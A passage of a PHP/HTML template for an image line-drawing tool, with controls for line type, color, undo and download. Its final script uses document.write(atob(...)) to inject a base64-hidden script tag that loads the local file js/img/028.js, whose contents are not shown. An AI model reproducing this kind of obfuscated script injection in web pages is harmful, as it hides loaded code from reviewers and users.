...
<html lang="en"> <?php include('admin/head.php'); ?> <?php include('admin/header.php'); ?> <?php include('admin/user.php'); ?> <div id="post-header" class="post-header">
  ...
  <div class="toolarea">
    <style>
      ...
      #optionsContainer input[type="color"] {
        margin-left: 10px;
      }
    ...
    <div id="optionsContainer" style="display: none;">
      <label for="lineType">Choose line type:</label>
      <select id="lineType">
        <option value="horizontal">Horizontal</option>
        <option value="vertical">Vertical</option>
        <option value="diagonal">Diagonal</option>
      </select>
      <label for="lineColor">Choose line color:</label>
      <input type="color" id="lineColor" value="#ff0000">
      <br>
      <button id="addLinesBtn">Add Lines</button>
      <button id="undoBtn" style="display: none;">Undo</button>
      <button id="refreshBtn">Backword</button>
      <button id="downloadBtn" style="display: none;">Download Image</button>
    </div>
    <canvas id="canvas"></canvas>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDI4LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
